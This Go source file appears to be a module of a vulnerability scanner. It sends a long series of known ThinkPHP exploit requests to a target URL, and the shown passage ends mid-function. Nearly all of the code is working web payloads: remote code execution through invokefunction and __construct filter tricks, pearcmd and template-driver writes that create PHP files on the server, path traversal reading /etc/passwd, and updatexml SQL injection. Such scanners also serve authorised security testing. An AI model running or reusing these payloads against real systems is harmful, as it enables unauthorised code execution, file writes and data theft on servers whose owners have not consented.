package Cms

import (
	"errors"
	"fmt"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

type ThinkPHP struct {
	proxyUrl  string
	userAgent string
	timeOut   time.Duration
	headers   map[string]string
	url       string
}

func (thinkphp *ThinkPHP) SetUrl(url string) *ThinkPHP {
	thinkphp.url = url
	return thinkphp
}

func (thinkphp *ThinkPHP) SetProxyUrl(proxyUrl string) *ThinkPHP {
	thinkphp.proxyUrl = proxyUrl
	return thinkphp
}

func (thinkphp *ThinkPHP) SetUserAgent(userAgent string) *ThinkPHP {
	thinkphp.userAgent = userAgent
	return thinkphp
}

func (thinkphp *ThinkPHP) SetTimeout(timeout time.Duration) *ThinkPHP {
	thinkphp.timeOut = timeout
	return thinkphp
}

func (thinkphp *ThinkPHP) SetHeaders(headers map[string]string) *ThinkPHP {
	thinkphp.headers = headers
	return thinkphp
}

func (thinkphp *ThinkPHP) checkParameters() {
	if thinkphp.userAgent == "" {
		thinkphp.userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
	}
}

func (thinkphp *ThinkPHP) ScanAllExploits() (results chan string, errs chan error) {
	thinkphp.checkParameters()
	results = make(chan string, 10)
	errs = make(chan error, 10)
	go func() {
		result, err := thinkphp.LoadLangPack_lang() // 任意文件包含
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP6_session_file_write() // 文件读取
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_file_include() // 文件包含
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_invoke_func_code_exec_1()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_invoke_func_code_exec_2()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_construct_code_exec_1()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_construct_code_exec_2()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_construct_code_exec_3()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_construct_code_exec_4()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_construct_debug_rce()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_driver_display_rce()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_index_construct_rce()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_index_showid_rce()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_request_input_rce()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_method_filter_code_exec()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_debug_index_ids_sqli()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_templalte_driver_rce()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP5_dbinfo_leak()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP2_lite_code_exec()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP_cache()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP_checkcode_time_sqli()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP_multi_sql_leak()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP_pay_orderid_sqli()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP_update_sql()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		result, err = thinkphp.TP_view_recent_xff_sqli()
		if err != nil {
			errs <- err
		} else {
			if result != "" {
				results <- result
			}
		}

		<-time.NewTicker(3 * time.Second).C
		close(results)
		close(errs)
	}()
	return results, errs
}

// LoadLangPack_lang 任意文件包含漏洞
func (thinkphp *ThinkPHP) LoadLangPack_lang() (string, error) {
	var resp *req.Response
	var err error
	path := "/public/index.php?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "LoadLangPack_lang检测失败", thinkphp.url, err.Error()))
	}

	path = "/shell.php"

	resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "LoadLangPack_lang检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "phpinfo()") {
		return fmt.Sprintf("[+] %s -> %s\n", "LoadLangPack_lang存在漏洞", thinkphp.url), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "LoadLangPack_lang不存在漏洞", thinkphp.url), nil
	}
}

// TP6_session_file_write 文件读取
func (thinkphp *ThinkPHP) TP6_session_file_write() (string, error) {
	var resp *req.Response
	var err error
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s/VdVR9VB.php", thinkphp.url))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"Accept":     "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
			"Cookie":     "PHPSESSID=../../../../public/VdVR9VB.php",
			"Pragma":     "no-cache",
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		}).Get(fmt.Sprintf("%s/VdVR9VB.php", thinkphp.url))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp6_session_file_write检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "a:1:{s:4:\"name\";s:8:\"thinkphp\";}") {
		return fmt.Sprintf("[+] %s -> %s\n", "tp6_session_file_write存在漏洞", thinkphp.url), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp6_session_file_write不存在漏洞", thinkphp.url), nil
	}
}

// TP5_file_include 文件包含
func (thinkphp *ThinkPHP) TP5_file_include() (string, error) {
	var resp *req.Response
	var err error
	paths := []string{
		"?s=index/\\think\\Lang/load&file=/etc/passwd",
		"?s=index/\\think\\Lang/load&file=C:\\windows\\win.ini",
		"?s=index/\\think\\Config/load&file=/etc/passwd",
		"?s=index/\\think\\Config/load&file=C:\\windows\\win.ini",
	}

	for _, path := range paths {
		if len(thinkphp.headers) != 0 {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s/%s", thinkphp.url, path))
		} else {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s/%s", thinkphp.url, path))
		}

		if err != nil {
			return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_file_include检测失败", thinkphp.url, err.Error()))
		}

		if strings.Contains(resp.String(), "for 16-bit app support") == true || strings.Contains(resp.String(), "root:") == true {
			return fmt.Sprintf("[+] %s -> %s\n", "tp5_file_include存在漏洞", fmt.Sprintf("%s/%s\n", thinkphp.url, path)), nil
		} else {
			continue
		}
	}

	return fmt.Sprintf("[-] %s -> %s\n", "tp5_file_include不存在漏洞", thinkphp.url), nil
}

func (thinkphp *ThinkPHP) TP5_session_include() (string, error) {
	var resp *req.Response
	var err error
	paths := []string{
		"/index.php?s=captcha",
		"/index.php/index",
	}

	payloads := []string{
		"_method=__construct&method=GET&filter[]=think\\__include_file&get[]=/tmp/sess_cvfm8xgtpwkqhae6umhfcjqmx&server[]=1",
		"_method=__construct&filter[]=think\\Session::set&method=get&get[]=test&server[]=1",
	}

	for _, path := range paths {
		for _, payload := range payloads {
			if len(thinkphp.headers) != 0 {
				resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
			} else {
				resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
					"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
					"Content-type": "application/x-www-form-urlencoded",
				}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
			}

			if err != nil {
				return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_session_include检测失败", thinkphp.url, err.Error()))
			}
			if strings.Contains(resp.String(), "think|a:") == true {
				return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_session_include存在漏洞", thinkphp.url), nil
			} else {
				continue
			}
		}
	}

	return fmt.Sprintf("[-] %s -> %s\n", "tp5_session_include不存在漏洞", thinkphp.url), nil
}

func (thinkphp *ThinkPHP) TP5_invoke_func_code_exec_1() (string, error) {
	var resp *req.Response
	var err error
	payload := "/index.php/?s=index/think\\app/invokefunction&function=phpinfo&vars[0]=-1"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, payload))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, payload))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_invoke_func_code_exec_1检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "PHP Version") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_invoke_func_code_exec_1存在漏洞", thinkphp.url, payload), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_invoke_func_code_exec_1不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_invoke_func_code_exec_2() (string, error) {
	var resp *req.Response
	var err error
	payload := "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, payload))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, payload))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_invoke_func_code_exec_2检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "56540676a129760a") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_invoke_func_code_exec_2存在漏洞", thinkphp.url, payload), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_invoke_func_code_exec_2不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_construct_code_exec_1() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?s=captcha"
	payload := "_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]=dylan"

	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-type": "application/x-www-form-urlencoded",
		}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_construct_code_exec_1检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_construct_code_exec_1存在漏洞", thinkphp.url, payload), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_construct_code_exec_1不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_construct_code_exec_2() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?s=captcha"
	payload := "_method=__construct&method=GET&filter[]=var_dump&get[]=dylan"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-type": "application/x-www-form-urlencoded",
		}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_construct_code_exec_2检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_construct_code_exec_2存在漏洞", thinkphp.url, payload), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_construct_code_exec_2不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_construct_code_exec_3() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?s=captcha"
	payload := "s=dylan&_method=__construct&method=POST&filter[]=var_dump"

	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-type": "application/x-www-form-urlencoded",
		}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_construct_code_exec_3检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_construct_code_exec_3存在漏洞", thinkphp.url, payload), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_construct_code_exec_3不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_construct_code_exec_4() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?s=captcha"
	payload := "aaaa=dylan&_method=__construct&method=GET&filter[]=var_dump"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-type": "application/x-www-form-urlencoded",
		}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_construct_code_exec_4检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_construct_code_exec_4存在漏洞", thinkphp.url, payload), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_construct_code_exec_4不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_construct_debug_rce() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php"
	payload := "_method=__construct&filter[]=var_dump&server[REQUEST_METHOD]=dylan"

	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-Type": "application/x-www-form-urlencoded",
		}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_construct_code_exec_4检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_construct_code_exec_4存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_construct_code_exec_4不存在漏洞", thinkphp.url), nil

	}
}

func (thinkphp *ThinkPHP) TP5_driver_display_rce() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_driver_display_rce检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "4f97319b308ed6bd3f0c195c176bbd77") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_driver_display_rce存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_driver_display_rce不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_index_construct_rce() (string, error) {
	var resp *req.Response
	var err error

	path := "/index.php?s=index/index/index"
	payloads := []string{
		"s=Blo7x&_method=__construct&method&filter[]=var_dump",
		"s=Blo7x&_method=__construct&method=POST&filter[]=var_dump",
		"s=Blo7x&_method=__construct&method=GET&filter[]=var_dump",
		"_method=__construct&method=GET&filter[]=var_dump&get[]=Blo7x",
	}

	for _, payload := range payloads {
		if len(thinkphp.headers) != 0 {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
		} else {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
				"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
				"Content-Type": "application/x-www-form-urlencoded",
			}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
		}
		if err != nil {
			return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_index_construct_rce检测失败", thinkphp.url, err.Error()))
		}

		if strings.Contains(resp.String(), "string(5) \"") == true {
			return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_index_construct_rce存在漏洞", thinkphp.url, path), nil
		} else {
			continue
		}
	}

	return fmt.Sprintf("[-] %s -> %s\n", "tp5_index_construct_rce不存在漏洞", thinkphp.url), nil
}

func (thinkphp *ThinkPHP) TP5_index_showid_rce() (string, error) {
	var resp *req.Response
	var err error
	paths := []string{
		"/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]",
		"/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C23_02_19.log'",
	}

	for _, path := range paths {
		if len(thinkphp.headers) != 0 {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
		} else {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
				"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
				"Content-Type": "application/x-www-form-urlencoded",
			}).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
		}

		if err != nil {
			return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_index_showid_rce检测失败", thinkphp.url, err.Error()))
		}

		if strings.Contains(resp.String(), "56540676a129760a3") == true {
			return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_index_showid_rce存在漏洞", thinkphp.url, path), nil
		} else {
			continue
		}
	}
	return fmt.Sprintf("[-] %s -> %s\n", "tp5_index_showid_rce不存在漏洞", thinkphp.url), nil
}

func (thinkphp *ThinkPHP) TP5_request_input_rce() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?s=index/\\think\\Request/input&filter=var_dump&data=md5(2333)"

	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-Type": "application/x-www-form-urlencoded",
		}).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_request_input_rce检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "f7e0b956540676a129760a3eae309294") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_request_input_rce存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_request_input_rce不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_method_filter_code_exec() (string, error) {
	var resp *req.Response
	var err error
	path := "/public/index.php"
	payload := "c=var_dump&f=md5(2333)&_method=filter"

	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-Type": "application/x-www-form-urlencoded",
		}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[-]%s -> %s %s\n", "tp5_method_filter_code_exec检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "f7e0b956540676a129760a3eae309294") == true {
		return fmt.Sprintf("[+]%s -> %s%s\n", "tp5_method_filter_code_exec存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-]%s -> %s\n", "tp5_method_filter_code_exec不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_debug_index_ids_sqli() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-type": "application/x-www-form-urlencoded",
		}).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_debug_index_ids_sqli检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "cf67355a3333e6e143439161adc2d82") == true {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_debug_index_ids_sqli存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_debug_index_ids_sqli不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP5_templalte_driver_rce() (string, error) {
	var resp *req.Response
	var err error

	paths := []string{
		"/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=mqz.php&content=%3C?php%20var_dump(md5(2333));?%3E",
		"/mqz.php",
	}

	for _, path := range paths {
